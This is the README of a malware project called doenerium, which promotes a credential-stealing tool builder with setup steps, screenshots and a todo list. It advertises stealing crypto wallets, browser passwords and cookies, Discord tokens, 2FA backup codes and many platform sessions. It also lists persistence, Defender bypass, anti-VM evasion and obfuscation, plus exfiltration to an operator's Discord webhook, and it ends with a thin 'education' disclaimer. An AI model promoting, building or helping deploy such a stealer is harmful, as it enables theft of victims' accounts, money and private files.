<a id="top"></a>
<h1 align="center">
💎 TELEGRAM GET BANNED JOIN .gg/doenerium ⭐
</h1>
<br>
<p align="center"> 
  <kbd>
<img src="https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp" width="328"></img>
  </kbd>
</p>

<h1 align="center">
💎 NEXT UPDATE + FIX DETECT AT 270 STARS ⭐
</h1>

<p align="center">
<img src="https://img.shields.io/github/last-commit/doenerium6969/doenerium-fixed?style=flat">
<img src="https://img.shields.io/github/stars/doenerium69/doenerium?color=brightgreen">
<img src="https://img.shields.io/github/forks/doenerium69/doenerium?color=brightgreen">
</p>
<br>

## 🌐 〢 Content

- [📁 Setting up](#setup)
- [⚔️ Features](#features)
- [📸 Screenshots](#screenshot)
- [📝 Todo](#todo)
- [📜 License](#license)
- [⚠️ Note](#note)

<a id="setup"></a>

---

### 📁  〢 Setting Up
>
> [![Watch the video](https://cdn.discordapp.com/attachments/1206389634926383234/1286525981061808148/image_3.png?ex=6728e4f0&is=67279370&hm=4c1056a24208216456e29e1df631279e6209583d6c83a15da1038564e737b544&)](https://streamable.com/veupi7)
>
>
> Install [Node.js](https://nodejs.org/en/download/prebuilt-installer/current) `IMPORTANT: Install NodeJS with Tools for Native Modules`
> 
> ***VERY IMPORTANT***: When installing Node.js also install **"Tools for Native Modules"** => Tick `Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes.`
>
> First run the `install.bat` file to install all necessary packages and `start.bat`.
>
> After the build, click `Ressources` to choose an icon for your executable. 
> ``The filetype must be ".ico" and the icon should be 16x16px, 32x32px, 64x64px, 128x128px, 256x256px`` 
>

<a id="features"></a>


---

### ⚔️ 〢 Features

#### Stealer

> No Dependent Clipper (exe does not need to stay running for the clipper to work)
>
> Wallet Injection 12words + passwords [ Exodus, Atomic ]
> 
> Percistance Hidden Startup + if reg get deleted = auto come back :)
>
> Files Stealer [.txt, .doc, .docx, .rdp, .pdf and more]
>
> Binder, will add exclusion to your file to bypass defender.
> 
> Discord Token, Friends with rare badges, Credit card
>
> Discord Info - Username, Phone number, Email, Billing, Nitro Status & Backup Codes
>
> Discord About Me changer, HQ Guilds Admin/Owner
>
> Steal Backup 2FA Code [ Discord, Epic Games, Github ]
>
> Grabs crypto wallets -
> 💸 Zcash
> 🚀 Armory
> 📀 Bytecoin
> 💵 Jaxx
> 💎 Exodus
> 📉 Ethereum
> 🔨 Electrum
> 🕹️ AtomicWallet
> 💹 Guarda
> ⚡ Coinomi
> 🦊 MetaMask
>
> Browser (Chrome, Opera, Firefox, OperaGX, Edge, Brave, Yandex) -
> Passwords, Cookies, Autofill & History (Searches for specific keywords such as PayPal, Coinbase etc. in them)
>
> Screenshots all screen
>
> Telegram Session stealer
>
> Riot Games Session stealer
> 
> FTP stealer (FileZilla)
>
> VPN Stealer
>
> Growtopia Stealer
>
> Minecraft Session stealer & validator
> 
> Instagram Session stealer & validator
> 
> Roblox Session stealer & validator
>
> Steam Session stealer & validator
>
> TikTok Session stealer & validator
>
> Twitter Session stealer & validator
>
> Reddit Session stealer & validator
>
> Epic Games Launcher Session stealer



### 🏹 〢 Additional

> Internet connection check every 3 seconds before it starts stealing
>
> Ultra Obfuscation (use https://obfuscator.io)
>
> Disable UAC / Anti-Debug / Anti-VM / Blue Screen if detect
>
> No Traces and silent
>
> Validates a found discord token and then sends it to your discord webhook
>
> Sends all files to your discord webhook in beautiful embeds and a structured zip file
>
> Automatic obfuscation when building (12 sec to build exe | 30-40mb)

<a id="screenshot"></a>

---

### 📸 〢 Screenshots
<img title="" src="https://cdn.discordapp.com/attachments/1199547023398010950/1286508649233256529/image.png?ex=6731668c&is=6730150c&hm=b0916aad7c0da9504d3762aaa148158cdcf081da1afe223e0777e29a6f4f6297&" alt="" width="820">
<img title="" src="https://cdn.discordapp.com/attachments/1223099035162771528/1283270003491213394/Sans_titre.png?ex=67317bd2&is=67302a52&hm=23d95790201c2cd735449fc587baef6d8d7e5e23eff65529f379cad9ad1c29be&" alt="" width="820">
<img title="" src="https://cdn.discordapp.com/attachments/1206389634926383234/1230294887778357300/image.png?ex=67313de7&is=672fec67&hm=87281a924bed7773808e84a43e5d1050ede2f00e51620b5ebe96353856f61699&" alt="" width="820">
<img title="" src="https://cdn.discordapp.com/attachments/1206389634926383234/1230249925086937218/image.png?ex=67311407&is=672fc287&hm=f6f181bc441eb6a97bb4a187ecfe26446211f59631e7613dd1c082e540ed2892&" alt="" width="820">
<img title="" src="https://media.discordapp.net/attachments/994591063253733407/1218385119677513898/Screenshot_12.png?ex=67316b91&is=67301a11&hm=6ac2122de77da51c1364786c9f69f4ee4d8ea321f2c0ca336cda0586682acf28&" alt="" width="820">
<img title="" src="https://cdn.discordapp.com/attachments/994591063253733407/1219372808333693058/Screenshot_1.png?ex=67310eec&is=672fbd6c&hm=2f268658d0804ec561a30605db7574b9f15658c18ed59bcebd9a85933e42a478&" alt="" width="820">
<img title="" src="https://media.discordapp.net/attachments/994591063253733407/1218381908203929773/Screenshot_3.png?ex=67316893&is=67301713&hm=7e5dcca65dea7cab812ee03a070a06224b400622d219aaab0dcfc6a9a2566340&" alt="" width="820">
<img title="" src="https://media.discordapp.net/attachments/994591063253733407/1218381997198672003/Screenshot_7.png?ex=673168a8&is=67301728&hm=1484b37ae31994905d4e4a8d0564f40dfcdbe71ebc3d4a4530832ae13a84e229&" alt="" width="820">
<img title="" src="https://media.discordapp.net/attachments/994591063253733407/1218381947546501191/Screenshot_11.png?ex=6731689c&is=6730171c&hm=1e04b9e87b8b450fa9f63252793c263bf9b2dc99b89e9ebcd300d12ee84bbe9e&" alt="" width="820">
<img title="" src="https://media.discordapp.net/attachments/994591063253733407/1218385666837319803/Screenshot_13.png?ex=67316c13&is=67301a93&hm=ea87aeb8a0679e338b0824d9196121ee305be060091855fbe689e8089a64e30b&" alt="" width="820">
<img title="" src="https://cdn.discordapp.com/attachments/660885288079589385/1206900306638540830/Screenshot_6.png?ex=67312ac0&is=672fd940&hm=9c0090e4c8da9e917ccae5eef0ce9e493460c25b9e15be40800f6a26b9f122e5&" alt="" width="820">



<a id="todo"></a>

---

### 📝 〢 Todo

> - ~~Exodus wallet injection (get the password whenever the user logs in the wallet)~~
> - More grabbers (VPN's, Gaming, Messengers)
> - Keylogger/<strike>Clipper</strike>
> - Telegram bot to build within Telegram
> - <strike>Stable Version recive log by Telegram</strike>
> - Firefox stealer
>   
> - [Click here](https://discord.gg/doenerium) to request new features that you would like to see in the next version of our software ?
<a id="license"></a>

---

### 📜 〢 License

By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see [commonsclause](https://commonsclause.com/)

<a id="note"></a>

---

### ⚠️ 〢 Note

I am not responsible for any damages this software may cause after being acquired. This software was made for personal education and sandbox testing.
